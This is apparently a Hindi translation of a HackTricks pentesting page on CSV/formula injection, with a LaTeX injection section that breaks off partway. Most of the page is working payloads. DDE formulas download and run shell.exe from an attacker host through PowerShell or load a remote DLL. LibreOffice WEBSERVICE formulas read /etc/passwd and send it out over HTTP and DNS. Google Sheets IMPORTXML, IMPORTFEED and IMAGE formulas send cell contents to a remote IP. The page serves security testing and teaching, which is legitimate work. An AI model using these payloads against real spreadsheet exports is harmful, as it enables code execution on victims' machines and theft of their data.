# рд╕реВрддреНрд░/CSV/рдбреЙрдХ/рд▓рд╛рдЯреЗрдХреНрд╕/рдЧреЛрд╕реНрдЯрд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдиреНрдЬреЗрдХреНрд╢рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡реЗ рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝реА рдЦреЛрдЬреЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдЕрдзрд┐рдХ рдорд╛рдпрдиреЗ рд░рдЦрддреА рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред рдЗрдВрдЯреНрд░реВрдбрд░ рдЖрдкрдХреА рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХрд╛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрд╛рд░рдгрд╛ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреА рдкреВрд░реА рддрдХрдиреАрдХреА рд╕реНрдЯреИрдХ, API рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рддрдХ рдореБрджреНрджреЗ рдЦреЛрдЬрддрд╛ рд╣реИред [**рдЖрдЬ рд╣реА рдореБрдлреНрдд рдореЗрдВ рдЗрд╕рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## рд╕реВрддреНрд░ рдЗрдиреНрдЬреЗрдХреНрд╢рди

### рдЬрд╛рдирдХрд╛рд░реА

рдпрджрд┐ рдЖрдкрдХрд╛ **рдЗрдирдкреБрдЯ** **CSV рдлрд╝рд╛рдЗрд▓** (рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓) рдореЗрдВ **рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд** рд╣реЛ рд░рд╣рд╛ рд╣реИ (рдЬрд┐рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ **рдПрдХреНрд╕реЗрд▓** рджреНрд╡рд╛рд░рд╛ рдЦреЛрд▓рд╛ рдЬрд╛рдПрдЧрд╛), рддреЛ рдЖрдк рдПрдХреНрд╕реЗрд▓ **рд╕реВрддреНрд░** рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЙрд╕ рд╕рдордп **рдЪрд▓рд╛рдП рдЬрд╛рдПрдВрдЧреЗ** рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдлрд╝рд╛рдЗрд▓ рдЦреЛрд▓рддрд╛ рд╣реИ** рдпрд╛ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдПрдХреНрд╕реЗрд▓ рд╢реАрдЯ рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ**ред

{% hint style="danger" %}
рдЖрдЬрдХрд▓ **рдПрдХреНрд╕реЗрд▓** (рдХрдИ рдмрд╛рд░) **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЪреЗрддрд╛рд╡рдиреА рджреЗрдЧрд╛** рдЬрдм рдХреБрдЫ **рдПрдХреНрд╕реЗрд▓ рдХреЗ рдмрд╛рд╣рд░ рд╕реЗ рд▓реЛрдб рд╣реЛрдЧрд╛** рддрд╛рдХрд┐ рдЙрд╕реЗ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХрд╛рд░реНрд░рд╡рд╛рдИ рд╕реЗ рдмрдЪрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рд▓рд┐рдП, рдЕрдВрддрд┐рдо рдкреЗрд▓реЛрдб рдкрд░ рд╕реЛрд╢рд▓ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдкрд░ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
{% endhint %}

### [рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ

**рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдЕрдВрддрд┐рдо рдПрдХреНрд╕реЗрд▓ рд╢реАрдЯ рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдмрд╛рд╣рд░ рд▓реЗ рдЬрд╛рдиреЗ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реИред рд▓реЗрдХрд┐рди рдЗрд╕реЗ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ (рдФрд░ рдЪреЗрддрд╛рд╡рдиреА рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП)ред**

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рдПрдХ рдЫрд╛рддреНрд░ рд░рд┐рдХреЙрд░реНрдб рдкреНрд░рдмрдВрдзрди рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрди рдХреА рдПрдХ CSV рдЕрдзрд┐рд╖реНрдард╛рдкрди рд╣рдорд▓реЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрддреНрдкрдиреНрди рдПрдХрд▓ рд╣реИред рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдЙрджреНрджреЗрд╢реНрдп рд╢рд┐рдХреНрд╖рдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЫрд╛рддреНрд░ рд╡рд┐рд╡рд░рдг рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪрд╛рдирд╛ рд╣реИред рдЗрд╕ рд╡рд┐рдзрд┐ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд╡рд┐рд╖рд╛рджреА рдкреЗрд▓реЛрдб рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдврд▓рд╛рдиреЗ рдореЗрдВ рд╕рдВрд▓рдЧреНрди рд╣реЛрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЫрд╛рддреНрд░ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рд╣рд╛рдирд┐рдХрд╛рд░рдХ рд╕реВрддреНрд░ рджрд░реНрдЬ рдХрд░рдХреЗред рд╣рдорд▓рд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рдХрд╛рд░ рд╕реЗ рдЦреБрд▓рддрд╛ рд╣реИ:

1. **рд╡рд┐рд╖рд╛рджреА рдкреЗрд▓реЛрдб рдХрд╛ рдЕрдзрд┐рд╖реНрдард╛рдкрди:**
- рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЫрд╛рддреНрд░ рд╡рд┐рд╡рд░рдг рдлреЙрд░реНрдо рд╕рдмрдорд┐рдЯ рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдПрдХ рдлреЙрд░реНрдореВрд▓рд╛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рдореЗрдВ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ, `=HYPERLINK("<malicious_link>","рдпрд╣рд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ")`ред)
- рдпрд╣ рдлреЙрд░реНрдореВрд▓рд╛ рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдПрдХ рд╡рд┐рд╖рд╛рджреА рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдкреЛрдЗрдВрдЯ рдХрд░рддрд╛ рд╣реИред

2. **рдЖрдкрддреНрддрд┐рдЬрдирдХ рдбреЗрдЯрд╛ рдХрд╛ рдирд┐рд░реНрдпрд╛рдд:**
- рд╢рд┐рдХреНрд╖рдХ, рдХрдВрдкреНрд░рдорд╛рдЗрдЬ рдХреЗ рдЕрдирдЬрд╛рди рд╣реЛрддреЗ рд╣реБрдП, рдбреЗрдЯрд╛ рдХреЛ рдПрдХ CSV рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рд░реНрдпрд╛рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред
- CSV рдлрд╝рд╛рдЗрд▓, рдЬрдм рдЦреЛрд▓реА рдЬрд╛рддреА рд╣реИ, рдЕрдм рднреА рд╡рд┐рд╖рд╛рджреА рдкреЗрд▓реЛрдб рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИред рдпрд╣ рдкреЗрд▓реЛрдб рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рдореЗрдВ рдПрдХ рдХреНрд▓рд┐рдХ рдХреЗ рдпреЛрдЧреНрдп рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрдЯ рд╣реЛрддрд╛ рд╣реИред

3. **рд╣рдорд▓рд╛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдирд╛:**
- рдПрдХ рд╢рд┐рдХреНрд╖рдХ рд╣рд╛рдЗрдкрд░рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рдорд╛рдирдХрд░ рдХрд┐ рдпрд╣ рдЫрд╛рддреНрд░ рдХреЗ рд╡рд┐рд╡рд░рдг рдХрд╛ рд╡реИрдз рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред
- рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдкрд░, рдЬрд╛рдирдХрд╛рд░реА (рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рд╕реЗ рд╡рд┐рд╡рд░рдг рдпрд╛ рд╢рд┐рдХреНрд╖рдХ рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рд╕реЗ) рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИред

4. **рдбреЗрдЯрд╛ рдХрд╛ рд▓реЙрдЧрд┐рдВрдЧ:**
- рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ рд╕рд░реНрд╡рд░ рд╢рд┐рдХреНрд╖рдХ рдХреЗ рдХрдВрдкреНрдпреВрдЯрд░ рд╕реЗ рднреЗрдЬреЗ рдЧрдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдФрд░ рд▓реЙрдЧ рдХрд░рддрд╛ рд╣реИред
- рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ рдЗрд╕ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡рд┐рднрд┐рдиреНрди рджреБрд░рд╛рдЪрд╛рд░реА рдЙрджреНрджреЗрд╢реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЫрд╛рддреНрд░реЛрдВ рдФрд░ рд╕рдВрд╕реНрдерд╛рди рдХреА рдЧреЛрдкрдиреАрдпрддрд╛ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдФрд░ рдЕрдзрд┐рдХ рдХреНрд╖рддрд┐ рдкрд╣реБрдВрдЪ рд╕рдХрддреА рд╣реИред


### RCE

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдпрд╣ **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡рд┐рдиреНрдпрд╛рд╕ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**:\
рдлрд╝рд╛рдЗрд▓ тЖТ рд╡рд┐рдХрд▓реНрдк тЖТ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреЗрдВрджреНрд░ тЖТ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХреЗрдВрджреНрд░ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ тЖТ рдмрд╛рд╣реНрдп рд╕рд╛рдордЧреНрд░реА тЖТ рдбрд╛рдпрдирд╛рдорд┐рдХ рдбреЗрдЯрд╛ рдПрдХреНрд╕рдЪреЗрдВрдЬ рд╕рд░реНрд╡рд░ рд▓реЙрдиреНрдЪ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ\
рдпрд╛ **рдкреБрд░рд╛рдирд╛ рдПрдХреНрд╕реЗрд▓ рд╕рдВрд╕реНрдХрд░рдг** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

рдЕрдЪреНрдЫреА рдЦрдмрд░ рдпрд╣ рд╣реИ рдХрд┐ **рдпрд╣ рдкреЗрд▓реЛрдб рдлрд╝рд╛рдЗрд▓ рдЦреЛрд▓рдиреЗ рдкрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ** (рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЪреЗрддрд╛рд╡рдирд┐рдпреЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ)ред

рдЗрд╕ рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдПрдХ рдХреИрд▓рдХреБрд▓реЗрдЯрд░ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png>) 

### рдЕрдзрд┐рдХ
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* рдпрд╣ рд╕реНрдерд╛рдиреАрдп /etc/passwd рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдкрдврд╝реЗрдЧрд╛: `='file:///etc/passwd'#$passwd.A1`
* рдЗрд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓реЗрдВ: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓реЗрдВ: `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS Exfiltration: `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**DNS ex-filtration payload рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг:**

* тАШfile:///etc/passwdтАЩ#$passwd.A19 тАУ рд╕реНрдерд╛рдиреАрдп /etc/passwd рдлрд╝рд╛рдЗрд▓ рд╕реЗ 19рд╡реАрдВ рдкрдВрдХреНрддрд┐ рдкрдврд╝реЗрдЧрд╛
* ENCODEURL(тАШfile:///etc/passwdтАЩ#$passwd.A19) тАУ рд╡рд╛рдкрд╕ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдбреЗрдЯрд╛ рдХреЛ URL encode рдХрд░реЗрдЧрд╛
* MID((ENCODEURL(тАШfile:///etc/passwdтАЩ#$passwd.A19)),1,41) тАУ substring рдХреЗ рд╕рдорд╛рди, 1рд╡реЗрдВ рд╡рд░реНрдг рд╕реЗ 41рд╡реЗрдВ рддрдХ рдбреЗрдЯрд╛ рдкрдврд╝реЗрдЧрд╛ - DNS рд╣реЛрд╕реНрдЯрдиреЗрдо рдХреА рд▓рдВрдмрд╛рдИ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рд╣реА рдЙрдкрдпреЛрдЧреА рддрд░реАрдХрд╛ (FQDN рдкрд░ 254 рд╡рд░реНрдг рд╕реАрдорд╛ рдФрд░ рд▓реЗрдмрд▓ рдХреЗ рд▓рд┐рдП 63 рд╡рд░реНрдг, рдЕрд░реНрдерд╛рдд рд╕рдмрдбреЛрдореЗрди)
* SUBSTITUTE(MID((ENCODEURL(тАШfile:///etc/passwdтАЩ#$passwd.A19)),1,41),тАЭ%тАЭ,тАЭ-тАЬ) тАУ рд╕рднреА % рдХреА рдШрдЯрдирд╛рдУрдВ рдХреЛ рдбреИрд╢ рд╕реЗ рдмрджрд▓реЗрдЧрд╛ - рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреЗрд╡рд▓ рд╡реИрдз DNS рд╡рд░реНрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(тАШfile:///etc/passwdтАЩ#$passwd.A19)),1,41),тАЭ%тАЭ,тАЭ-тАЬ)),тАЭ.\<FQDN>тАЭ) тАУ рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рдЬреЛрдбрд╝реЗрдВ (рдЬрдм рдКрдкрд░ рдХрд╛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рд╣реЛ рдЪреБрдХрд╛ рд╣реИ) FQDN рдХреЗ рд╕рд╛рде (рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдЙрд╕ рдбреЛрдореЗрди рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рдзрд┐рдХрд╛рд░рд┐рдХ рд╣реЛрд╕реНрдЯ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ)
* WEBSERVICE тАУ рдЗрд╕ рдЕрд╕реНрддрд┐рддреНрд╡ рдореЗрдВ рди рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ DNS рдирд╛рдо рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕реЗ рд╣рдо рдлрд┐рд░ рд▓реЙрдЧреНрд╕ (рдпрд╛ DNS рдкреНрд░рд╛рдзрд┐рдХрд╛рд░рд┐рдХ рдирд╛рдо рд╕рд░реНрд╡рд░ рдкрд░ tcpdump рдЖрджрд┐ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ) рдкрд╛рд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕ рдкрд░ рд╣рдорд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рдг рд╣реИ

### Google Sheets OOB рдбреЗрдЯрд╛ Exfiltration

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЪрд▓рд┐рдП рдХреБрдЫ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдлрд╝рдВрдХреНрд╢рди рдкреЗрд╢ рдХрд░рддреЗ рд╣реИрдВред

**CONCATENATE**: рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХ-рджреВрд╕рд░реЗ рд╕реЗ рдЬреЛрдбрд╝рддрд╛ рд╣реИред
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: XML, HTML, CSV, TSV, рдФрд░ RSS рдФрд░ ATOM XML рдлреАрдб рд╕рд╣рд┐рдд рд╡рд┐рднрд┐рдиреНрди рд╕рдВрд░рдЪрд┐рдд рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИред
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: RSS рдпрд╛ ATOM рдлрд╝реАрдб рдХреЛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИред
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: рдПрдХ HTML рдкреЗрдЬ рдХреЗ рднреАрддрд░ рд╕реВрдЪреА рдпрд╛ рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИред
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рд╕реЗ рд╕реЗрд▓ рдХреА рд░реЗрдВрдЬ рдЖрдпрд╛рдд рдХрд░рддрд╛ рд╣реИред
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**рдЫрд╡рд┐**: рдПрдХ рдЫрд╡рд┐ рдХреЛ рдПрдХ рд╕реЗрд▓ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИред
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## LaTeX Injection

рд╕рд╛рдорд╛рдиреНрдпрдд: рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рдЬреЛ **LaTeX рдХреЛрдб рдХреЛ PDF рдореЗрдВ рдмрджрд▓рддреЗ рд╣реИрдВ** рд╡реЗ **`pdflatex`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред\
рдпрд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо (рдЕрди)рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП 3 рдореБрдЦреНрдп рдЧреБрдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:

* **`--no-shell-escape`**: `\write18{command}` рдирд┐рд░рд╕реНрдд рдХрд░реЗрдВ, рдпрджрд┐ рдпрд╣ texmf.cnf рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИред
* **`--shell-restricted`**: `--shell-escape` рдХреЗ рд╕рдорд╛рди, рд▓реЗрдХрд┐рди 'рд╕реБрд░рдХреНрд╖рд┐рдд' рд╕реЗрдЯ рдХреЗ **рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд** \*\*рдХрдорд╛рдВрдбреНрд╕ (\*\*Ubuntu 16.04 рдкрд░ рд╕реВрдЪреА `/usr/share/texmf/web2c/texmf.cnf` рдореЗрдВ рд╣реИ)ред
